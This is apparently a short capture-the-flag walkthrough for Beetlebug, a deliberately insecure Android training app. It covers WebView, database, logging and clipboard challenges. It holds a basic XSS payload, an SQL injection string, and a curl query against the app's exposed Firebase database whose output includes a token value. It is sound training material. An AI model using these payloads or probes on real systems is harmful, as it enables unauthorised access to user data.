In this part I will start with 
## WebViews tasks 
![image](https://github.com/user-attachments/assets/2a024a74-d7d2-4e1d-8486-33b0bdd7fe34)

### Java Script Code Injection 
In this task we should enter an xss payload . This link helps you to understand XSS 
 https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss
and here is the payload
```Java
<script>alert('Hello, World!');</script>
```
## Insecure Database 
![image](https://github.com/user-attachments/assets/4b1ca7a6-a3e8-4040-8eb0-efe838d1e722)

### SQLi 
```SQL
random' OR 1 --
```
### Misconfig 
```Bash
PS C:\Users\mahdi>  curl https://beetlebug-374fc-default-rtdb.firebaseio.com/.json
{"Beetlebug":"Beetlebug is an open source insecure Android application with CTF challenges built for Mobile Pentesters, Bug Bounty Hunters and Developers.","admin":{"Exploit":"Successful","email":"test@gmail.cm","message":"hello","name":"user","website":"https://google.com"},"flag":"0x3365A10","hacker":{"Exploit":"Successful","email":"hacker@gmail.com","message":"hello hacker","name":"hacker@abc","website":"http://google.com"},"test":{"Exploit":"Successfull","email":"test@test.com","message":"test hack","name":"test","website":"test.com"},"testing1":{"-ODkTgQjJBr3iqyAt2Kd":{"cat":"meow","dog":"bowbow"}},"userId":1631721730509,"userToken":"cp__rEcAQnuIIxGKzJ5QVd:APA91bEJkYBRCmjCN0lAxOCZof5Tn75kB2O_6mcurklu6fcs6HKWx5LaSIS2TPIziQy5LSVAoP5bNevfwNvNMX9MG90kr5ppHnoWv9Kdbh309Sq13Lai_vtMuOk1AWAE1qKLnHCgTYo0"}
PS C:\Users\mahdi>
The flag is ""flag":"0x3365A10""
```
## Sensitive Info Disclosure 
![image](https://github.com/user-attachments/assets/515c3c2d-8c04-4f1f-ac84-5ba9f8c7c872)

## Insecure Logging 
after you enter a random data , you should focus on logs with this command 
```Bash
adb logcat
```
and finaly we get it 
![Capture d'écran 2025-01-15 184558](https://github.com/user-attachments/assets/c112bff7-5d2e-4db3-a519-0c8a5fd320fa)
## Clipboard Data 
After you enter any random data yo will get the flag 


![Capture d'écran 2025-01-15 185206](https://github.com/user-attachments/assets/9d8ac430-dc2e-4224-ab5d-cc54d943c661)
